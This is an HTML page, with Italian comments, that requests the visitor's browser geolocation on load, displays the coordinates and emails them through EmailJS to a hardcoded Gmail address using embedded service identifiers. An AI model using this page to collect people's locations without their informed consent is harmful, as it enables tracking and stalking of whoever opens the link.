<!DOCTYPE html>
<html>
<head>
    <title>Rivela Posizione</title>
</head>
<body>
<h1>La tua posizione attuale</h1>
<p id="location">Ottenendo la posizione...</p>

<!-- Usa l'ultimo URL dell'SDK di EmailJS -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3.2.0/dist/email.min.js"></script>
<script type="text/javascript">
    function loadEmailJS(callback) {
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3.2.0/dist/email.min.js';
        script.onload = function() {
            console.log("EmailJS script loaded.");
            callback();
        };
        document.head.appendChild(script);
    }

    function initializeEmailJS() {
        emailjs.init("h1nGpLNhcn1VTDf7q"); // Sostituisci con il tuo user_id (Public Key) da EmailJS
        console.log("EmailJS inizializzato con user_id: h1nGpLNhcn1VTDf7q");
    }

    function showPosition(position) {
        console.log("Posizione ottenuta: ", position);
        var locationElement = document.getElementById("location");
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;

        locationElement.innerHTML = "Latitudine: " + latitude + "<br>Longitudine: " + longitude;

        // Invia la posizione via email usando EmailJS
        var templateParams = {
            latitude: latitude,
            longitude: longitude,
            to_email: 'cilindromagico2.0@gmail.com' // Sostituisci con l'indirizzo email del destinatario
        };

        console.log("Tentativo di invio email con i seguenti parametri:", templateParams);
        emailjs.send('service_ig15rg6', 'template_3bx3ri4', templateParams)
            .then(function(response) {
                console.log('Email inviata correttamente!', response.status, response.text);
                alert('Email inviata correttamente!');
            }, function(error) {
                console.error('Errore nell\'invio dell\'email:', error);
                alert('Errore nell\'invio dell\'email: ' + JSON.stringify(error));
            });
    }

    function showError(error) {
        var locationElement = document.getElementById("location");
        switch(error.code) {
            case error.PERMISSION_DENIED:
                locationElement.innerHTML = "L'utente ha negato la richiesta di geolocalizzazione.";
                console.error("Errore: Permessi negati");
                break;
            case error.POSITION_UNAVAILABLE:
                locationElement.innerHTML = "Le informazioni sulla posizione non sono disponibili.";
                console.error("Errore: Posizione non disponibile");
                break;
            case error.TIMEOUT:
                locationElement.innerHTML = "La richiesta di ottenimento della posizione è scaduta.";
                console.error("Errore: Timeout");
                break;
            case error.UNKNOWN_ERROR:
                locationElement.innerHTML = "Si è verificato un errore sconosciuto.";
                console.error("Errore: Errore sconosciuto");
                break;
        }
    }

    function getLocation() {
        if (navigator.geolocation) {
            console.log("Richiesta di geolocalizzazione inviata.");
            navigator.geolocation.getCurrentPosition(showPosition, showError);
        } else {
            document.getElementById("location").innerHTML = "La geolocalizzazione non è supportata da questo browser.";
            console.error("Errore: Geolocalizzazione non supportata");
        }
    }

    window.onload = function() {
        loadEmailJS(initializeEmailJS);
        getLocation();
    };
</script>
</body>
</html>
